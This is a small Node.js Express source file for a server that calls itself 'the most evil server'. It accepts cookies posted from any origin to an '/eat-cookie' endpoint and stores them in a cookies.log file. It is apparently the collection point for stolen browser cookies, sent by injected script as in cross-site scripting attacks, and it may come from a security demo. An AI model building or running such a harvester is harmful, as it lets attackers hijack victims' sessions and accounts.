import { Worker } from "./worker";
import express from "express";
const http = require("http");
const fs = require("fs");

require("dotenv").config();
const app = express();
const worker = new Worker();

var cors = require("cors");

app.use(express.json());
app.use(cors());
app.use(`/public`, express.static("./public"));

http.createServer(app).listen(4000, () => {
  const cookies = "./cookies.log";

  try {
    fs.readFileSync(cookies);
  } catch (error) {
    fs.writeFileSync(cookies, "");
  }

  console.log(`The most evil server has started successfully.`);
});

app.post("/eat-cookie", function (req, res) {
  worker.saveCookie(req.body.cookie);
  res.send("😋🍪");
});

app.all("*", function (req, res) {
  res.send("😛🍪");
});
